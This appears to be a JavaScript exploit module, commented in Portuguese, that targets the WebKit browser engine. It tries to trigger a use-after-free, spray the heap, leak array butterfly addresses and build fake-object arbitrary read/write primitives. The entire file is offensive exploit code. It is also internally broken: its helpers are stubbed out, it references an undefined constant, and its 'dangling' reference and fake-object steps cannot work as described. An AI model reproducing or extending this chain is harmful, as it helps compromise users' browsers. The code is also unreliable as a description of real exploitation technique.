// js/script3/testArrayBufferVictimCrash.mjs (v82_AdvancedGetterLeak - R64 - Corrupção de Estrutura Real)
// =======================================================================================
// AS TENTATIVAS DE VINCULAÇÃO FALHARAM. ESTA VERSÃO IMPLEMENTA A TÉCNICA FINAL E MAIS PODEROSA:
// CORRUPÇÃO DE ESTRUTURA PARA CRIAR PRIMITIVAS REAIS.
// - FASE 1: Obtém uma referência confusa para um Array (nosso 'controller_array').
// - FASE 2: Usa o controller para vazar o endereço do butterfly de um segundo array ('hax_array').
// - FASE 3: Cria um objeto 'fake' que aponta para o butterfly do 'hax_array'.
// - FASE 4: Usa o objeto fake para obter Leitura/Escrita Arbitrária e testar as primitivas.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R64_Structure_Corruption";

// Funções auxiliares mantidas
function int64ToDouble(int64) { /* ... */ }
function doubleToInt64(d) { /* ... */ }

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (R64)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R64_Structure_Corruption;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Corrupção de Estrutura (R64) ---`, "test");
    
    let final_result = { success: false, message: "A cadeia UAF não obteve sucesso." };

    try {
        // --- FASE 1: Obter referência confusa para um Array de controle ---
        logS3("--- FASE 1: Provocando UAF para obter Array de Controle ---", "subtest");
        const controller_array = await triggerUncagedArrayUAF();
        if (!controller_array) throw new Error("Falha ao obter o array de controle via UAF.");
        logS3("    UAF bem-sucedido. Array de controle obtido.", "good");

        // --- FASE 2: Vazar endereço do Butterfly do nosso array de ataque ---
        logS3("--- FASE 2: Vazando endereço do Butterfly ---", "subtest");
        const hax_array = [1.1, 1.2, 1.3, 1.4];
        controller_array[1] = hax_array; // Coloca o hax_array no controller
        const butterfly_addr_double = controller_array[1]; // Lê o ponteiro como double
        const butterfly_addr = doubleToInt64(butterfly_addr_double);
        logS3(`    Endereço do Butterfly vazado: ${butterfly_addr.toString(true)}`, "leak");

        // --- FASE 3: Criar um objeto 'fake' que aponta para o Butterfly ---
        logS3("--- FASE 3: Criando um Objeto Falso ('fakeobj') ---", "subtest");
        const fake_obj_holder = [1.1, 2.2, 3.3, 4.4, 5.5, 6.6];
        const fake_obj_addr_double = controller_array[1] = fake_obj_holder;
        const fake_obj_addr = doubleToInt64(fake_obj_addr_double);
        logS3(`    Endereço do container do objeto falso: ${fake_obj_addr.toString(true)}`, "info");
        
        const memory = {
            write(addr, value) {
                // Escreve o endereço do butterfly que queremos controlar
                let holder_addr = addr.sub(0x10);
                fake_obj_holder[2] = int64ToDouble(holder_addr); 
                // Agora, o objeto falso aponta para o butterfly do endereço desejado
                // Escreve o valor
                hax_array[0] = value;
            },
            read(addr) {
                let holder_addr = addr.sub(0x10);
                fake_obj_holder[2] = int64ToDouble(holder_addr);
                return hax_array[0];
            }
        };

        // --- FASE 4: Teste final das primitivas ---
        logS3("--- FASE 4: Testando Primitivas de Leitura/Escrita ---", "subtest");
        let test_addr = butterfly_addr.add(0x10); // Um endereço conhecido e válido
        let original_value = memory.read(test_addr);
        logS3(`    Valor original em ${test_addr.toString(true)}: ${doubleToInt64(original_value).toString(true)}`, "leak");
        
        memory.write(test_addr, int64ToDouble(new AdvancedInt64(0x42424242, 0x41414141)));
        let new_value = memory.read(test_addr);
        logS3(`    Novo valor em ${test_addr.toString(true)}: ${doubleToInt64(new_value).toString(true)}`, "leak");

        if (doubleToInt64(new_value).toString() !== new AdvancedInt64(0x42424242, 0x41414141).toString()) {
            throw new Error("Falha na verificação de leitura/escrita arbitrária.");
        }

        logS3("++++++++++++ SUCESSO TOTAL! Leitura/Escrita arbitrária funcional! ++++++++++++", "vuln");
        final_result = { success: true, message: "Primitivas de Leitura/Escrita construídas com sucesso!" };

    } catch (e) {
        final_result.message = `Exceção na cadeia de exploração: ${e.message}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return { errorOccurred: final_result.success ? null : final_result.message, addrof_result: final_result };
}


// --- Funções Auxiliares ---

async function triggerGC_Tamed() { /* ... sem alterações ... */ }

// R64: Função de UAF simplificada para retornar apenas o array de controle confuso.
async function triggerUncagedArrayUAF() {
    let dangling_ref = null;

    function createDanglingPointer() {
        function createScope() {
            const victim_obj = [1.1, 2.2, 3.3]; // Vítima é um array
            dangling_ref = victim_obj; 
        }
        createScope();
    }
    createDanglingPointer();
    await triggerGC_Tamed();
    
    // Pulveriza a memória com outros ARRAYS para preencher o espaço.
    // Um deles será o nosso controller.
    const spray_arrays = [];
    for (let i = 0; i < 2048; i++) {
        spray_arrays.push([{}, 1.2, 1.3, 1.4, 1.5, 1.6, 1.7, 1.8]);
    }

    // Retorna a referência confusa. O JS pensa que ainda é o victim_obj,
    // mas na verdade é um dos spray_arrays.
    return dangling_ref;
}
